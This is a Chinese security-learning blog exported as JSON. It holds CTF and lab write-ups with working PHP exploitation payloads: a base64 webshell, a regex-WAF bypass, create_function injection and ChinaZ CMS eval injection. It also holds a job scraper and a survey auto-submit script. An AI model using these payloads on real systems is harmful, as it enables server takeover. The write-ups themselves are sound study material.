{"meta":{"title":"慢就是快 | glotozz'blog","subtitle":"这个人比较菜，什么话也留不下","description":null,"author":"glotozz","url":"http://yoursite.com","root":"/"},"pages":[{"title":"感谢","date":"2019-07-18T11:37:42.000Z","updated":"2019-07-18T11:38:41.901Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":"谢谢支持我的小伙伴"}],"posts":[{"title":"codebreaking-3","slug":"codebreaking-3","date":"2019-08-14T07:35:35.000Z","updated":"2019-08-14T13:21:13.944Z","comments":true,"path":"2019/08/14/codebreaking-3/","link":"","permalink":"http://yoursite.com/2019/08/14/codebreaking-3/","excerpt":"第三题lei啦拉拉","text":"第三题lei啦拉拉 12345678910111213141516171819202122232425262728&lt;?php if(isset($_GET[&apos;read-source&apos;])) &#123; exit(show_source(__FILE__)); &#125; define(&apos;DATA_DIR&apos;, dirname(__FILE__) . &apos;/data/&apos; . md5($_SERVER[&apos;REMOTE_ADDR&apos;])); if(!is_dir(DATA_DIR)) &#123; mkdir(DATA_DIR, 0755, true); &#125; chdir(DATA_DIR); $domain = isset($_POST[&apos;domain&apos;]) ? $_POST[&apos;domain&apos;] : &apos;&apos;; $log_name = isset($_POST[&apos;log&apos;]) ? $_POST[&apos;log&apos;] : date(&apos;-Y-m-d&apos;); if(!empty($_POST) &amp;&amp; $domain): $command = sprintf(&quot;dig -t A -q %s&quot;, escapeshellarg($domain)); $output = shell_exec($command); $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES); $log_name = $_SERVER[&apos;SERVER_NAME&apos;] . $log_name; if(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [&apos;php&apos;, &apos;php3&apos;, &apos;php4&apos;, &apos;php5&apos;, &apos;phtml&apos;, &apos;pht&apos;], true)) &#123; file_put_contents($log_name, $output); &#125; echo $output; endif; ?&gt; escapeshellarg()把字符串转码为可以在 shell 命令里使用的参数，将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。 htmlspecialchars()将特殊字符转换为 HTML 实体 而一句话木马需要&lt; 首先第一步，解决&lt;被转义的问题 file_put_contents($log_name, $output); 在file_put_contents()中，$log_name可以设置读取文件内容解码，那么只需要将文件内容base64编码即可 测试发现： 需要把服务器部署到linux上，因为windows中没有dig这个命令😔 $log_name是取自http头中的host 而$output中有一部分内容是domain 第二步，解决文件后缀的问题 只要在后缀名后加上/. pathinfo就取不到后缀名，且可以正常写入.php之中。具体原理可以参考链接😀，php在处理路径的时候，会递归的删除掉路径中存在的/. 解码中遇到不符合规范的字符直接跳过。所以虽然我们只能控制一部分内容，但是其他内容并不影响base64解码。另外因为base64解码是4位4位的解的，所以我们要保证我们需要解码的字符串之前的合法字符数为4的倍数，字符范围是A—Z，a—z，0—9，+，/ 测试： 搜集刚才的xxx得到的结果（注意去掉符号）为 ltltgtgtDiG994RedHat99474el762ltltgtgttAq，长度为41，所以需要先补充3个没用的aaa。这里还有一点需要注意的是，base64中的=只能出现在最末尾，而我们插入的字符串是在中间的，所以我们插入的字符串里不能有= 在线的base64中存在 ==，用php的base64_encode不存在 == payload: host:php ?domain=aaaPD9waHAgQGV2YWwoJF9HRVRbJzEyMyddKTs/Pg&amp;log=://filter/convert.base64-decode/resource=a3.php/. 但是又奇了个怪，怎么也写不进去。。。 file_put_contents()该函数将返回写入到文件内数据的字节数，失败时返回FALSE var_dump(file_put_contents())发现确实是false，权限也改成777了，我cao 又是之前遇到过的那个问题，突然想起来centos7需要 关闭SELINUX 1234&gt; vi /etc/selinux/config&gt; SELINUX=disabled #增加，别的都注释掉&gt; setenforce 0 #使配置立即生效&gt; 写入成功！！😀 一个文件只能写一次，如果文件已经存在也会写入失败 如果base64编码最后出现了==，可以舍去，因为本来也是用来补全的 参考链接http://wonderkun.cc/index.html/?p=626#comments https://paper.seebug.org/755/#easy-phpmagic http://f1sh.site/2018/11/25/code-breaking-puzzles%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/","categories":[],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://yoursite.com/tags/代码审计/"},{"name":"codebreaking","slug":"codebreaking","permalink":"http://yoursite.com/tags/codebreaking/"}]},{"title":"未完成的seacms","slug":"未完成的seacms","date":"2019-08-14T04:02:41.000Z","updated":"2019-08-14T04:36:23.431Z","comments":true,"path":"2019/08/14/未完成的seacms/","link":"","permalink":"http://yoursite.com/2019/08/14/未完成的seacms/","excerpt":"昨天复现了chinaz中的3个命令执行漏洞，其中第3个虽然复现成功了，但是对payload还是不太懂，原理与海洋CMS类似，这里就来复现下海洋CMS","text":"function doDecrypt (pwd, onError) { console.log('in doDecrypt'); const txt = document.getElementById('enc_content').innerHTML; let plantext; try { const bytes = CryptoJS.AES.decrypt(txt, pwd); var plaintext = bytes.toString(CryptoJS.enc.Utf8); } catch(err) { if(onError) { onError(err); } return; } document.getElementById('enc_content').innerHTML = plaintext; document.getElementById('enc_content').style.display = 'block'; document.getElementById('enc_passwd').style.display = 'none'; if(typeof MathJax !== 'undefined') { MathJax.Hub.Queue( ['resetEquationNumbers', MathJax.InputJax.TeX], ['PreProcess', MathJax.Hub], ['Reprocess', MathJax.Hub] ); } } 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 var onError = function(error) { document.getElementById(\"enc_error\").innerHTML = \"password error!\" }; function decrypt() { var passwd = document.getElementById(\"enc_pwd_input\").value; console.log(passwd); doDecrypt(passwd, onError); }","categories":[],"tags":[{"name":"cms","slug":"cms","permalink":"http://yoursite.com/tags/cms/"}]},{"title":"codebreaking-2","slug":"codebreaking-2","date":"2019-08-14T04:01:05.000Z","updated":"2019-08-14T07:52:34.527Z","comments":true,"path":"2019/08/14/codebreaking-2/","link":"","permalink":"http://yoursite.com/2019/08/14/codebreaking-2/","excerpt":"第二题lei啦啦啦","text":"第二题lei啦啦啦 easy - pcrewaf1234567891011121314151617&lt;?php function is_php($data)&#123; return preg_match(&apos;/&lt;\\?.*[(`;?&gt;].*/is&apos;, $data); &#125; if(empty($_FILES)) &#123; die(show_source(__FILE__)); &#125; $user_dir = &apos;data/&apos; . md5($_SERVER[&apos;REMOTE_ADDR&apos;]); $data = file_get_contents($_FILES[&apos;file&apos;][&apos;tmp_name&apos;]); if (is_php($data)) &#123; echo &quot;bad request&quot;; &#125; else &#123; @mkdir($user_dir, 0755); $path = $user_dir . &apos;/&apos; . random_int(0, 10) . &apos;.php&apos;; move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;], $path); header(&quot;Location: $path&quot;, true, 303); &#125; 文件名不可控，文件内容可控 但是需要绕过 preg_match(‘/&lt;?.[(`;?&gt;]./is’, $data); 参考链接里面的 pcre.backtrack_limit 这个配置决定了在php中，正则引擎回溯的层数。而这个值默认是1000000. 举个例子 123正则：\\&lt;\\?.*[(`;?&gt;].*输入：&lt;?php phpinfo();//aaaaa 1234567891011121314匹配过程\\&lt; =&gt; &lt;\\? =&gt; ?.* =&gt; php phpinfo();//aaaaa [(`;?&gt;] =&gt; php phpinfo();//aaaa 开始回溯 1 [(`;?&gt;] =&gt; phpinfo();//aaa 21[(`;?&gt;] =&gt; phpinfo();//aa 3[(`;?&gt;] =&gt; phpinfo();//a 4[(`;?&gt;] =&gt; phpinfo();// 5[(`;?&gt;] =&gt; phpinfo();/ 6[(`;?&gt;] =&gt; phpinfo(); 7[(`;?&gt;] =&gt; phpinfo() 8[(`;?&gt;] =&gt; phpinfo();.* =&gt; phpinfo();//aaaaa 一共回溯了8次 可想而知，回溯的次数是有上限的，默认是100万，可以通过语句来查看 1234var_dump(ini_get(&apos;pcre.backtrack_limit&apos;));返回string(7) &quot;1000000&quot; 如果回溯次数超过了100万，查看 1234var_dump(preg_match(&apos;/&lt;\\?.*[(`;?&gt;].*/is&apos;, &apos;&lt;?php phpinfo();//.str_repeat(&apos;c&apos;,1000000)&apos;));返回bool(false) 所以，这道题的答案就呼之欲出了。我们通过发送超长字符串的方式，使正则执行失败，最后绕过目标对PHP语言的限制。 123456789import requestsfrom io import BytesIOfiles = &#123; &apos;file&apos;: BytesIO(b&apos;aaa&lt;?php phpinfo();//&apos; + b&apos;a&apos; * 1000000)&#125;res = requests.post(&apos;http://127.0.0.1/codebreaking/easy-pcrewaf/&apos;, files=files, allow_redirects=False)print(res.headers) 访问/data/f528764d624db129b32c21fbca0cb8d6即可，其中data/后面是md5(‘’) p神还提到了另一种更常见的waf 1234&lt;?phpif(preg_match(&apos;/UNION.+?SELECT/is&apos;, $input)) &#123; die(&apos;SQL Injection&apos;);&#125; 这里涉及到了正则表达式的“非贪婪模式”。具体参考p神的链接 回溯次数随着a的数量增加而增加。所以，我们仍然可以通过发送大量a，来使回溯次数超出pcre.backtrack_limit限制，进而绕过WAF 修复也很简单：用preg_match对字符串进行匹配，一定要使用===全等号来判断返回值， 参考链接：https://paper.seebug.org/755/ https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html https://regex101.com","categories":[],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://yoursite.com/tags/代码审计/"},{"name":"codebreaking","slug":"codebreaking","permalink":"http://yoursite.com/tags/codebreaking/"}]},{"title":"codebreaking-1","slug":"codebreaking-1","date":"2019-08-14T02:20:02.000Z","updated":"2019-08-14T04:19:09.122Z","comments":true,"path":"2019/08/14/codebreaking-1/","link":"","permalink":"http://yoursite.com/2019/08/14/codebreaking-1/","excerpt":"chrome+phpstorm的调试问题真是醉了，想起之前看到同学在刷code breaking，正好可以看看那个😀","text":"chrome+phpstorm的调试问题真是醉了，想起之前看到同学在刷code breaking，正好可以看看那个😀 easy - function12345678&lt;?php $action = $_GET[&apos;action&apos;] ?? &apos;&apos;; $arg = $_GET[&apos;arg&apos;] ?? &apos;&apos;; if(preg_match(&apos;/^[a-z0-9_]*$/isD&apos;, $action)) &#123; show_source(__FILE__); &#125; else &#123; $action(&apos;&apos;, $arg);&#125; $a ?? 0 等同于 isset($a) ? $a : 0 preg_match()返回 pattern 的匹配次数。 它的值将是0次（不匹配）或1次，因为preg_match()在第一次匹配后 将会停止搜索。要想办法绕过正则， ^ 匹配字符串开头，在多行模式中匹配每一行的开头$ 匹配字符串末尾，在多行模式中匹配每一行的末尾 模式分隔符后的”i”标记这是一个大小写不敏感的搜索 模式分隔符后的”s”标记模式中的点号元字符匹配所有字符, 包含换行符 模式分隔符后的”D”标记模式中的元字符美元符号仅仅匹配目标字符串的末尾. 正则很明显，就是要想办法在函数名的头或者尾找一个字符，不影响函数调用。 怎么找呢，fuzz大法好 当然fuzz也有技巧，有时候可以先自己写个脚本fuzz.php 这里不需要修改脚本，只需要在传值的时候在fuzz后加上一个正常的函数名，我用了var_dump，第一次用了echo会报错 (○´･д･)ﾉ 发现#是400错误，\\正常显示，原理可以参考给出的链接 然后是控制第二个参数来执行命令，可以使用create_function()来完成 函数结构 1234567create_function(&apos;$a,$b&apos;,&apos;return 111&apos;)==&gt; function a($a,$b)&#123; return 111;&#125; 我们想要执行任意代码，首先需要跳出函数定义 1234567create_function(&apos;$a,$b&apos;,&apos;return 111;&#125;phpinfo();//&apos;)==&gt;function a($a, $b)&#123; return 111;&#125;phpinfo();//&#125; 很奇怪的是直接执行下面的会报错，而且不能把//去掉 123function a($a, $b)&#123; return 111;&#125;phpinfo();//&#125; 所以最后的payload： ?action=\\create_function&amp;arg=}phpinfo();// 参考链接：https://paper.seebug.org/755/ phpstorm的调试问题真是醉了，想起之前看到同学在刷","categories":[],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://yoursite.com/tags/代码审计/"},{"name":"codebreaking","slug":"codebreaking","permalink":"http://yoursite.com/tags/codebreaking/"}]},{"title":"chinaz的代码执行和命令执行漏洞","slug":"chinaz的代码执行和命令执行漏洞","date":"2019-08-13T04:57:44.000Z","updated":"2019-08-13T05:52:43.257Z","comments":true,"path":"2019/08/13/chinaz的代码执行和命令执行漏洞/","link":"","permalink":"http://yoursite.com/2019/08/13/chinaz的代码执行和命令执行漏洞/","excerpt":"Xman回来的第2天，把刘哥发的北京营的ppt看了下，复现了chinaz的三个命令执行漏洞，以前都是盲目刷题，题目质量层次不齐，对很多原理也是一知半解，在Xman的时候和张力大佬聊了许多，以后要多复现CMS。","text":"Xman回来的第2天，把刘哥发的北京营的ppt看了下，复现了chinaz的三个命令执行漏洞，以前都是盲目刷题，题目质量层次不齐，对很多原理也是一知半解，在Xman的时候和张力大佬聊了许多，以后要多复现CMS。 1、index.php1234567891011121314&lt;?php require_once(&quot;library/common.php&quot;); require_once(&quot;library/view.php&quot;); $view_class = new View(); $data = array(); if (isset($_GET[&apos;page&apos;])) &#123; $data[&apos;page&apos;] = filter($_GET[&apos;page&apos;]); &#125; else&#123; $data[&apos;page&apos;] = &apos;js&apos;; &#125; $view_class-&gt;echoContent($data[&apos;page&apos;], $data);?&gt; index页面通过page参数调用不同功能的php页面 2、action.php12345678910&lt;?php require_once(&quot;library/common.php&quot;); require_once(&quot;library/view.php&quot;); $page = filter($_POST[&apos;page&apos;]).&apos;.php&apos;; $post_data = array(); foreach ($_POST as $key =&gt; $value) &#123; $post_data[$key] = $value; &#125; @require_once($page);?&gt; 存在文件包含，但是存在后缀.php，过滤主要是filter， 全局搜索 12345&gt; function filter($input)&gt; &#123;&gt; return str_replace(&apos;.&apos;, &apos;&apos;, $input);&gt; &#125;&gt; 将 . 过滤成空，文件包含路径中不能有 . 导致无法使用相对路径 那么我们可以使用绝对路径进行包含。 可以包含常见重要文件或日志文件 3、common.php12345function write_log($input)&#123; global $cfg_logfile; file_put_contents($cfg_logfile, $input, FILE_APPEND);&#125; 123456789101112function loadFile($filePath)&#123; global $cfg_basedir; if(!file_exists($filePath))&#123; write_log(&apos;Try to open Null file:&apos;.$filePath); return file_get_contents($cfg_basedir.&apos;/error.php&apos;); &#125; $fp = @fopen($filePath,&apos;r&apos;); $sourceString = @fread($fp,filesize($filePath)); @fclose($fp); return $sourceString;&#125; 1$cfg_logfile = dirname($_SERVER[&apos;SCRIPT_FILENAME&apos;]) . DS. &quot;logs/logfile.php&quot;; 当访问不存在的页面时，写入内容到logs/logfile.php中 4、漏洞一攻击复现构造payload： http://59.110.164.44:8238/?page=%3Cphp%20phpinfo();?%3E 访问： http://59.110.164.44:8238/logs/logfile.php 如果没有直接访问权限，也可以使用action.php中的文件包含， 并且可以看到phpinfo中，因此无法远程文件包含 allow_url_fopen On On allow_url_include Off Off 5、normaliz.php12345678910try&#123; if ($method == &apos;/\\\\d+\\\\.\\\\d+\\\\.\\\\d+\\\\.\\\\d+/&apos;) &#123; $res = preg_replace($method, $ip_replacement, $source); &#125; else &#123; $res = preg_replace($method, $mail_replacement, $source); &#125; &#125; preg_replace的正则如果加了e这个选项，会把正则表达式替换的部分替换之后的内容执行一下，然后将执行完的结果放入需要被替换的位置 method=/a/e&amp;mail_replacement=phpinfo()&amp;source=a; preg_replace(“/a/e”,”phpinfo()”,”a”); 但是php 7.0.0开始，不再支持/e修饰符，请用preg_replace_callback()代替 而且从前面的phpinfo得知我们的PHP版本是7.3.4🤦‍ 6、先解决变量覆盖问题1234567$view_class = new View();$data = array();$data[&apos;page&apos;] = &apos;normaliz&apos;;$ip_replacement = &apos;222.222.222.222&apos;;$mail_replacement = &apos;lollol@lol.com&apos;;$data[&apos;res&apos;] = action($post_data, $ip_replacement, $mail_replacement);$view_class-&gt;echoContent($data[&apos;page&apos;], $data); 除了$post_data，其他值都是写死的，如何控制 通过action.php的文件包含，进行变量覆盖控制 1234$post_data = array();foreach ($_POST as $key =&gt; $value) &#123; $post_data[$key] = $value;&#125; + normaliz.php 1234function action($post_data, $ip_replacement, $mail_replacement)&#123; foreach ($post_data as $key =&gt; $value) &#123; $$key = $value; &#125; 7、漏洞二攻击复现在本地将php切换为php5.4构造payload: http://127.0.0.1/chinaz/ post： page=normaliz&amp;method=/a/e&amp;mail_replacement=phpinfo()&amp;source=a 8、view.php1@eval(&quot;if(&quot;.$strIf.&quot;)&#123;\\$ifstatus=true;&#125;else&#123;\\$ifstatus=false;&#125;&quot;); 和典型的海洋cms漏洞差不多 1234&lt;?php $strIf=&apos;&quot;&quot;or phpinfo() or&quot;&quot;==&quot;&quot;&apos;; var_dump(&quot;if(&quot;.$strIf.&quot;)&#123;\\$ifstatus=true;&#125;else&#123;\\$ifstatus=false;&#125;&quot;); var_dump(@eval(&quot;if(&quot;.$strIf.&quot;)&#123;\\$ifstatus=true;&#125;else&#123;\\$ifstatus=false;&#125;&quot;)); 结果： 1234567string(66) &quot;if(&quot;&quot;or phpinfo() or&quot;&quot;==&quot;&quot;)&#123;$ifstatus=true;&#125;else&#123;$ifstatus=false;&#125;&quot;phpinfo()PHP Version =&gt; 7.3.4System =&gt; Windows NT DESKTOP-58QQPVV 10.0 build 17134 (Windows 10) AMD64............ 9、寻找攻击点123456789101112131415161718192021&lt;?php require_once(&quot;library/common.php&quot;); require_once(&quot;library/view.php&quot;); function action($post_data)&#123; foreach ($post_data as $key =&gt; $value) &#123; $$key = $value; &#125; if ($method===&apos;md5&apos;)&#123; $res = md5($source); &#125; if ($method===&apos;sha1&apos;)&#123; $res = sha1($source); &#125; return $res; &#125; $view_class = new View(); $data = array(); $data[&apos;page&apos;] = &apos;md5&apos;; $data[&apos;res&apos;] = action($post_data); $view_class-&gt;echoContent($data[&apos;page&apos;], $data);?&gt; md5文件包含了view.php，且有变量覆盖点，res可控制$strif 话是这么说，但是看了半天也看不懂res是怎么控制$strIf的，太多处理函数，最讨厌的一点是我每次firefox+burp+phpstorm调试一会就会断掉。。。不知道为啥😭 10、漏洞三复现构造payload： http://127.0.0.1/chinaz/action.php post：page=md5&amp;res=”or @eval($_POST[adddd]) or “&amp;adddd=phpinfo(); 这里的post的值需要bp抓包修改，因为hackbar直接传值res会变成”” 跟着pdf里面的流程走了一遍，除了第三个具体细节不是很懂，等下次复现海洋CMS的时候再回头看看把，还有希望有人帮我解决我的调试问题。","categories":[],"tags":[{"name":"cms","slug":"cms","permalink":"http://yoursite.com/tags/cms/"},{"name":"命令执行与代码执行","slug":"命令执行与代码执行","permalink":"http://yoursite.com/tags/命令执行与代码执行/"}]},{"title":"爬虫入门","slug":"爬虫入门","date":"2019-07-25T05:20:39.000Z","updated":"2019-08-13T05:48:03.453Z","comments":true,"path":"2019/07/25/爬虫入门/","link":"","permalink":"http://yoursite.com/2019/07/25/爬虫入门/","excerpt":"在软件创新实验室暑期集训的时候，叶同学讲了爬虫，这里简单把两种爬虫应用记录下。还有，我第一次接触爬虫是通过张宏伦的《全栈数据工程师》，感兴趣的可以去看看","text":"在软件创新实验室暑期集训的时候，叶同学讲了爬虫，这里简单把两种爬虫应用记录下。还有，我第一次接触爬虫是通过张宏伦的《全栈数据工程师》，感兴趣的可以去看看 1、爬取某网站的招聘信息1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677import requestsimport reimport timeimport jsonimport csvfrom bs4 import BeautifulSoupheaders = &#123; &apos;User-Agent&apos;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36&quot;&#125;s = requests.session()f = open(&quot;data.json&quot;, &quot;a&quot;, encoding=&apos;utf-8&apos;)def get_one_page(url): try: r = requests.get(url, headers=headers) r.encoding = r.apparent_encoding return r.text except: return &quot;爬取失败&quot;import pandas as pddef parse_page3(res): html = BeautifulSoup(res, &quot;html.parser&quot;) # print(res) result = [] place = html.select(&quot;#list_con &gt; li &gt; div.item_con.job_title &gt; div.job_name.clearfix &gt; a &gt; span.address&quot;) job = html.select(&apos;#list_con &gt; li &gt; div.item_con.job_title &gt; div.job_name.clearfix &gt; a &gt; span.name&apos;) salary = html.select(&apos;#list_con &gt; li &gt; div.item_con.job_title &gt; p&apos;) company = html.select(&apos;#list_con &gt; li &gt; div.item_con.job_comp &gt; div &gt; a&apos;) welfare = html.select(&apos;#list_con &gt; li &gt; div.item_con.job_title &gt; div.job_wel.clearfix&apos;) for place, job, salary, company, welfare in zip(place, job, salary, company, welfare): result.append(&#123; &quot;place&quot;: place.get_text(), &quot;job&quot;: job.get_text(), &quot;salary&quot;: salary.get_text(), &quot;company&quot;: company.get_text(), &quot;welfare&quot;: welfare.get_text() &#125;) # 储存为json文件 f.write(json.dumps(result, indent=2, ensure_ascii=False)) # 储存为csv文件(pandas) df = pd.DataFrame(result) df.to_csv(&apos;data2.csv&apos;, index=False, sep=&apos;,&apos;, mode=&apos;a&apos;) # 储存为excel文件 df = pd.DataFrame(result) df.to_csv(&apos;data3.xls&apos;, index=False, sep=&apos; &apos;, mode=&apos;a&apos;, encoding=&apos;utf-8_sig&apos;) return resultdef main(offset): url = &quot;https://hz.58.com/ywtzjingli/pn&quot; + str( offset) + &quot;/?classpolicy=main_null,job_A&amp;final=1&amp;jump=1&amp;PGTID=0d35f8c7-0004-f4fa-d607-70e9d941aa91&amp;ClickID=2&quot; html = get_one_page(url) result = parse_page3(html) # print(result) # tmp1 = [] # for dic in result: # print(dic) # tmp = [] # tmp.append(dic[&apos;place&apos;]) # tmp.append(dic[&apos;job&apos;]) # tmp.append(dic[&apos;salary&apos;]) # tmp.append(dic[&apos;company&apos;]) # tmp.append(dic[&apos;welfare&apos;]) # print(tmp) # tmp1.append(tmp)if __name__ == &apos;__main__&apos;: for i in range(1, 4): main(i) time.sleep(1) 2、自动填写问卷123456789101112131415161718192021222324252627282930313233import timefrom random import randintimport requestsurl = &quot;https://www.wjx.cn/joinnew/processjq.ashx?submittype=1&amp;curID=43819938&amp;t=1565166732242&amp;starttime=2019%2F8%2F7%2016%3A32%3A09&amp;ktimes=26&amp;rn=606189091.36417905&amp;hlv=1&amp;jqnonce=b636e088-5337-4ff5-973b-4ac2fd8b59ee&amp;jqsign=d050c6%3E%3E%2B3551%2B2%60%603%2B%3F15d%2B2ge4%60b%3Ed3%3Fcc&amp;jpm=17&quot;for i in range(1,10): header = &#123; &apos;Host&apos;:&apos;www.wjx.cn&apos;, &apos;User-Agent&apos;: 